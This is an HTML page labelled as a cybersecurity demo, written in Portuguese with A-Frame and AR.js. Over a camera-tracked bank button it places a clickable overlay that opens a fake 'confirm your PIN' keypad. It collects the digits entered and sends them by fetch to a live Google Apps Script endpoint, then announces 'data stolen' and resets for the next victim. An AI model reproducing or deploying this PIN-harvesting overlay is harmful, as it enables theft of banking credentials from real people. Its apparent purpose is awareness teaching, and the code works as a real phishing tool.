<!DOCTYPE html>
<html>
  <head>
    <title>Demo Cibersegurança - Versão Estável</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://raw.githack.com/AR-js-org/AR.js/master/aframe/build/aframe-ar.js"></script>
  </head>
  
  <body style="margin: 0px; overflow: hidden;">
    <a-scene embedded arjs="sourceType: webcam; debugUIEnabled: false;">
      
      <a-assets>
        <img id="btnBanco" src="botao_banco2.png">
      </a-assets>

      <a-entity cursor="fuse: false; rayOrigin: mouse" raycaster="objects: .clickable"></a-entity>

      <a-marker type="pattern" url="marker.patt">
        
        <a-image src="#btnBanco" position="0 0.01 0" rotation="-90 0 0" width="2.5" height="3.0"></a-image>

        <a-plane id="malicious-overlay" class="clickable" 
                 position="0 0.05 0" rotation="-90 0 0" 
                 width="2.5" height="3.0" material="opacity: 0.3; color: red" 
                 onclick="abrirPainel()">
        </a-plane>

        <a-entity id="fake-form" position="0 1 -1" rotation="-90 0 0" visible="false">
          
          <a-plane width="2.5" height="3.0" color="#111" material="opacity: 0.95"></a-plane>
          
          <a-text value="CONFIRME SEU PIN" align="center" position="0 1 0.1" scale="0.6 0.6 0.6"></a-text>
          
          <a-plane position="0 0.5 0.1" width="1.8" height="0.4" color="#333">
              <a-text id="pass-display" value="DIGITE..." align="center" position="0 0 0.05" scale="0.8 0.8 0.8" color="#00ff00"></a-text>
          </a-plane>

          <a-plane class="clickable" position="-0.7 -0.2 0.2" width="0.5" height="0.5" color="#444" onclick="registrarDigito('1')">
            <a-text value="1" align="center" position="0 0 0.01"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0 -0.2 0.2" width="0.5" height="0.5" color="#444" onclick="registrarDigito('2')">
            <a-text value="2" align="center" position="0 0 0.01"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0.7 -0.2 0.2" width="0.5" height="0.5" color="#444" onclick="registrarDigito('3')">
            <a-text value="3" align="center" position="0 0 0.01"></a-text>
          </a-plane>

          <a-plane class="clickable" position="0 -1 0.2" width="2" height="0.5" color="#27ae60" onclick="finalizarAtaque()">
              <a-text value="CONFIRMAR" align="center" position="0 0 0.01" scale="0.6 0.6 0.6"></a-text>
          </a-plane>
        </a-entity>
        
      </a-marker>

      <a-entity camera></a-entity>
    </a-scene>

   <script>
  let senhaColetada = "";
  // COLE O LINK DA SUA IMPLANTAÇÃO DO GOOGLE APPS SCRIPT AQUI:
  const URL_PLANILHA = "https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec";

  function abrirPainel() {
    document.querySelector('#fake-form').setAttribute('visible', 'true');
    document.querySelector('#malicious-overlay').setAttribute('visible', 'false');
    document.querySelector('[cursor]').components.raycaster.refreshObjects();
  }

  function registrarDigito(num) {
    senhaColetada += num;
    document.querySelector('#pass-display').setAttribute('value', '*'.repeat(senhaColetada.length));
  }

 function finalizarAtaque() {
    if(senhaColetada.length === 0) return;

    console.log("Tentando enviar senha:", senhaColetada);
    document.querySelector('#pass-display').setAttribute('value', 'ENVIANDO...');

    // Criando o formulário de dados para o Google
    const formData = new FormData();
    formData.append('senha', senhaColetada);

    // Usando uma técnica mais simples de envio que o Google aceita melhor
    fetch("https://script.google.com/macros/s/AKfycbz1k8PdYUutAn6JWMN8KpoGBy61bl70-UVmzwZ5-hQ55Dtpp9OQtlBYTUWe7FxKojA/exec", {
      method: 'POST',
      body: formData,
      mode: 'no-cors' 
    })
    .then(() => {
      alert("🚨 DADOS ROUBADOS!\n\nPIN: " + senhaColetada + "\n\nEnviado para a planilha com sucesso!");
      
      // Reseta a interface para a próxima pessoa
      senhaColetada = "";
      document.querySelector('#pass-display').setAttribute('value', 'DIGITE...');
      document.querySelector('#fake-form').setAttribute('visible', 'false');
      document.querySelector('#malicious-overlay').setAttribute('visible', 'true');
    })
    .catch(err => {
      console.error("Erro no envio:", err);
      alert("Erro ao conectar com o servidor hacker.");
    });
  }
</script>
  </body>
</html>
